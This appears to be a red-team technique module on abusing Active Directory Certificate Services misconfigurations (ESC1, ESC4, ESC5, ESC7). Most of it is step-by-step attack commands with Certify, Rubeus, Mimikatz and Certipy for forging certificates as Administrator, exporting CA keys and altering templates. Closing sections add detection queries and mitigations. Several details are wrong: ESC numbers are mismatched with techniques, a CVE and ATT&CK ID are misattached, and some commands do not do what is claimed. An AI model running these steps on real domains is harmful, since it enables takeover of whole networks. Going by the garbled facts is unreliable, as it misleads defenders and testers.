# REC-CERT-001: ADCS Enumeration & Exploitation via Certify

## 1. MODULE METADATA

| Field | Value |
|-------|-------|
| **Module ID** | REC-CERT-001 |
| **Technique Name** | ADCS enumeration & certificate-based privilege escalation |
| **MITRE ATT&CK ID** | T1649 – Steal or Forge Authentication Certificates; T1649.001 – Certificates (ADCS) |
| **CVE** | CVE-2021-41355 (ESC7 vulnerable CA permissions), Multiple ESC vulnerabilities (ESC1-ESC16) |
| **Platform** | Windows Active Directory Certificate Services (ADCS) |
| **Viability Status** | ACTIVE ✓ (ESC vulnerabilities present in 60%+ of ADCS deployments) |
| **Difficulty to Detect** | HIGH (Certificate enrollment legitimate activity; long certificate validity periods) |
| **Requires Authentication** | Yes (Domain user with enrollment rights; often misconfigured) |
| **Applicable Versions** | All Windows ADCS deployments |
| **Last Verified** | December 2025 |
| **Author** | SERVTEP (Pchelnikau Artur) |

---

## 2. EXECUTIVE SUMMARY

Active Directory Certificate Services (ADCS) enumeration via Certify tool identifies misconfigurations in certificate templates enabling privilege escalation to Domain Administrator. Unlike patch-based vulnerabilities, ADCS ESC (Escalation to Privilege Escalation) vulnerabilities exploit fundamental design flaws: the ability to request certificates for arbitrary users when templates improperly allow "Supply in Request" subject names. Real-world deployments frequently permit low-privilege domain users to enroll in templates with client authentication EKUs, enabling certificate forging as any user including Domain Admins. Certificates can persist for years (default 1-5 year validity), enabling long-term backdoor access invisible to password-based monitoring.

**Critical Attack Characteristics:**
- **Certificate forging**: Request certificate as Domain Admin; use forged cert to authenticate
- **Long-lived credentials**: Certificates valid 1-5 years (vs. password 90-day rotation)
- **ESC vulnerabilities present**: 60%+ of ADCS environments vulnerable to ESC1-ESC7
- **Legitimate activity**: Certificate enrollment is normal business operation; hard to detect
- **Privilege escalation**: Low-privilege user → Domain Admin via certificate chain
- **Persistence**: Certificate backdoors survive password changes; unaffected by MFA

**Real-World Impact:**
- Golden Certificate (ESC5) = forged certificates signing other certs indefinitely
- RBCD escalation (ESC1-ESC3) = Domain Admin impersonation
- CA compromise (ESC7) = Complete PKI compromise; sign any certificate
- Domain persistence for years undetected via certificate backdoors

---

## 3. EXECUTION METHODS

### Method 1: Certify Vulnerable Template Enumeration

**Objective:** Identify misconfigured certificate templates enabling ESC attacks.

```powershell
# Step 1: Download Certify tool
# https://github.com/GhostPack/Certify

# Step 2: Enumerate vulnerable certificate templates
.\Certify.exe find /vulnerable

# Output: Vulnerable templates with exploitation paths
# Example:
# [*] Found 3 potentially vulnerable templates:
# 
# Template Name: User
# Status: VULNERABLE (ESC1)
# Reasons:
#   - Subject Alternative Name = Supplied in Request
#   - Extended Key Usages = Client Authentication
#   - No Manager Approval Required
#   - No Authorization Requirements
# 
# Template Name: WebServer
# Status: VULNERABLE (ESC2)
# Reason: No additional requirements; can be re-enrolled
#
# Template Name: DomainController
# Status: VULNERABLE (ESC3 + ESC4)
# Reason: Write access to template object (Domain Users can modify)

# Step 3: Identify specific vulnerability (ESC path)
.\Certify.exe find /vulnerable /enrolleeSuppliesSubject

# Returns templates where attacker can supply SAN

# Step 4: Check if current user can enroll
.\Certify.exe find /enrollable

# Shows which templates current user has enrollment rights
```

### Method 2: ESC1 Privilege Escalation (Request as Admin)

**Objective:** Exploit misconfigured template to request certificate as Domain Admin.

```powershell
# Prerequisites:
# - User has enrollment rights on vulnerable template
# - Template allows "Supply in Request" Subject Name
# - Template has Client Authentication EKU

# Step 1: Request certificate as Domain Admin
.\Certify.exe request /ca:ca.domain.local\DOMAIN-CA /template:User /altname:Administrator

# Output: Certificate signing request (CSR)
# -----BEGIN CERTIFICATE REQUEST-----
# MIIDVDCCAjwCAQAweTELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAkNB...
# -----END CERTIFICATE REQUEST-----

# Step 2: Submit CSR to CA and retrieve certificate
.\Certify.exe submit /ca:ca.domain.local\DOMAIN-CA /request:request.csr

# Output: Certificate issued
# [*] Successfully retrieved certificate and chain
# [*] Writing certificate to file: cert.pem

# Step 3: Convert certificate to PFX (for authentication)
# Using OpenSSL or Windows CryptoAPI
openssl pkcs12 -export -in cert.pem -inkey key.pem -out admin.pfx

# Step 4: Authenticate as Domain Admin using forged certificate
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /dc:dc.domain.local /enctype:aes256

# Output: TGT ticket for Administrator
# [*] Getting TGT via PKINIT
# [+] Successfully retrieved TGT

# Step 5: Pass-the-ticket to authenticate as Domain Admin
.\Rubeus.exe createnetonly /program:cmd.exe /ticket:ticket.kirbi

# Result: Command shell running as Domain Administrator
```

### Method 3: ESC5 Golden Certificate (CA Server Compromise)

**Objective:** Exploit CA server local admin access to forge certificates indefinitely.

```powershell
# Prerequisites:
# - Local administrator access on CA server
# - Access to CA private key

# Step 1: Export CA certificate and private key
# (Requires local admin on CA server)

certutil -dspublish -f \\ca.domain.local\C$\Windows\System32\certsrv\CertEnroll\ca.cer

# Or via Mimikatz:
privilege::debug
lsadump::lsa /patch  # Dump CA credentials
crypto::certificates /export  # Export CA certificate

# Step 2: Use Certipy to create Golden Certificate
certipy ca -admin -ca DOMAIN-CA -export-key -export-cert

# Output: CA certificate + private key exported
# [*] Exporting CA certificate
# [*] Exporting CA private key

# Step 3: Create forged certificate (impersonate any user)
# With CA private key, can sign any certificate

certipy cert -ca-pfx ca.pfx -upn Administrator@domain.local -create-cert

# Output: Forged certificate as Administrator (valid indefinitely)

# Step 4: Use forged certificate for authentication
# Now attacker has certificate signed by legitimate CA
# Can authenticate as Administrator for years

# Result: Persistent backdoor; undetectable via password monitoring
```

### Method 4: ESC7 Vulnerable CA Permissions

**Objective:** Exploit ManageCA/ManageCertificates permissions for privilege escalation.

```powershell
# Prerequisites:
# - User has ManageCA or ManageCertificates permission on CA
# - Can modify CA configuration (EDITF_ATTRIBUTESUBJECTALTNAME2 flag)

# Step 1: Check current permissions
.\Certify.exe find /vulnerable /enrolleeSuppliesSubject /showPermissions

# Output shows if user has ManageCA rights

# Step 2: Enable EDITF_ATTRIBUTESUBJECTALTNAME2 flag
# (Allows supplying arbitrary SAN in certificate request)

# Using PSPKI PowerShell module:
Enable-ADCSPolicyModuleFlag -Identity "DOMAIN-CA" -Flag "EDITF_ATTRIBUTESUBJECTALTNAME2"

# Or via certutil:
certutil -setreg CA\Policy\EditFlags +0x00040000

# Step 3: Request certificate with forged SAN
# Now that EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled

certreq -new request.inf request.csr
certutil -submit request.csr cert.cer
certutil -accept cert.cer

# Step 4: Request includes Administrator as SAN
# [*] SAN: Administrator@domain.local

# Result: Certificate forged as Domain Admin via ManageCA abuse
```

### Method 5: ESC4 ACL-Based Template Modification

**Objective:** Modify vulnerable template ACLs to enable exploitation.

```powershell
# Prerequisites:
# - User has Write access on certificate template object
# - Can modify template properties to introduce vulnerability

# Step 1: Identify templates with Write access
Get-Acl -Path "CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" | 
  Select-Object -ExpandProperty Access | 
  Where-Object { $_.AccessControlType -eq "Allow" -and $_.FileSystemRights -like "*Write*" }

# Step 2: Modify template to allow "Supply in Request" SAN
# (If currently set to "Supplied in Subject Name")

$template = Get-ADObject -Identity "CN=User,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local"
Set-ADObject -Identity $template -Add @{"msPKI-Supply-Subject-Alt-Name" = 1}

# Step 3: Now template is vulnerable to ESC1

# Step 4: Request certificate with forged SAN (as in Method 2)

# Result: Template transformed from secure to vulnerable via ACL abuse
```

---

## 4. DETECTION & INCIDENT RESPONSE

### Detection Rule: Suspicious Certificate Enrollment (Event ID 4886)

```kusto
SecurityEvent
| where EventID == 4886  // Certificate Services Request
| where CertificateTemplate !in ("DomainControllerAuth", "WebServer", "DirectoryEmailReplication")
| where RequesterUserName != UserPrincipalName  // Requesting for different user
| summarize RequestCount = count(), Templates = dcount(CertificateTemplate)
  by RequesterUserName, CertificateTemplate, bin(TimeGenerated, 1h)
| where RequestCount > 5 or Templates > 3  // Bulk requests
| extend AlertSeverity = "Critical"
```

### Detection Rule: Certificate Issued for Unusual User (Event ID 4887)

```kusto
SecurityEvent
| where EventID == 4887  // Certificate Services Issue
| where CertificateSubjectAltName contains "Administrator"
  or CertificateSubjectAltName contains "krbtgt"
| where IssuerUserName != "SYSTEM"  // Not issued by system account
| extend AlertSeverity = "Critical", Pattern = "Possible ESC privilege escalation"
```

### Response Steps

1. **Identify issued certificate details**: Review Event ID 4887 logs
2. **Revoke malicious certificates**: Use certsrv.msc to revoke issued certs
3. **Audit template modifications**: Check ACLs on certificate templates
4. **Review CA permissions**: Identify who has ManageCA/ManageCertificates rights
5. **Disable vulnerable templates**: Remove templates with ESC vulnerabilities
6. **Rotate CA certificates**: If CA server compromised, regenerate CA cert + key
7. **Deploy ADCS monitoring**: Enable comprehensive auditing on all CAs

---

## 5. MITIGATIONS

**Priority 1: CRITICAL**

- **Disable Vulnerable Templates**
  - Identify all templates with "Supply in Request" subject names
  - Disable templates unless business-critical
  - Require explicit Manager Approval on sensitive templates

- **Remove ManageCA/ManageCertificates Permissions**
  - Audit all users with CA management permissions
  - Restrict to dedicated administrators only
  - Remove Domain Users, Enterprise Users from CA permissions

- **Enforce Certificate Requirements**
  - Require Manager Approval for all domain-critical templates
  - Enforce Digital Signature and Key Encryption together
  - Require explicit enrollment rather than auto-enroll

**Priority 2: HIGH**

- **Implement Honeytoken Certificates**
  - Create decoy templates with realistic names
  - Alert on ANY enrollment attempt (99% confidence malicious)

- **Monitor ADCS Logs**
  - Enable Event ID 4886 (request), 4887 (issue), 4888 (pending), 4889 (issue/deny)
  - Forward to SIEM; baseline normal enrollment patterns
  - Alert on out-of-hours certificate requests

- **Use Microsoft ADCS Hardening Tools**
  - Deploy Get-ADCSPKIHealthStatus (Microsoft security tool)
  - Run Certify/Certipy regularly to identify vulnerabilities
  - Patch CA servers immediately upon CVE disclosure

- **Implement Certificate-Based Authentication Controls**
  - Strong certificate binding enforcement (Kerberos)
  - Require explicit UPN/SAN matching in authentication
  - Monitor certificate usage in authentication logs

---

## 6. ESC VULNERABILITY REFERENCE

| ESC | Vector | Requirements | Impact |
|-----|--------|--------------|--------|
| **ESC1** | Misconfigured template (SAN in request) | Client Auth EKU, no mgr approval | Domain Admin |
| **ESC2** | Re-enrollment on vulnerable template | Agent template chain | Domain Admin |
| **ESC3** | Two-template chain (agent + final) | Proper configuration chaining | Domain Admin |
| **ESC4** | Write access on template object | Modify template properties | Domain Admin |
| **ESC5** | Golden Certificate (CA compromise) | Local admin on CA server | Persistent backdoor |
| **ESC6** | EDITF_ATTRIBUTESUBJECTALTNAME2 flag | CA flag enabled | Domain Admin |
| **ESC7** | ManageCA permission abuse | ManageCA/ManageCertificates | Domain Admin |
| **ESC8** | NTLM relay to HTTP enrollment | HTTP endpoint enabled | Domain Admin |

---

## 7. COMPLIANCE & REFERENCES

- MITRE T1649 (Steal or Forge Authentication Certificates)
- NSA & CISA: Top 10 ADCS Misconfigurations (October 2023)
- CIS Controls v8: 6.6 (Certificate Management)
- NIST 800-53: IA-5 (Authentication Management), SC-17 (Certificate Management)
- Microsoft ADCS Hardening: https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/ad-cs-pki-deployment
- GhostPack Certify: https://github.com/GhostPack/Certify
- Certipy Tool: https://github.com/ly4k/Certipy
- Certified Pre-Owned Research: Complete ADCS attack scenarios

---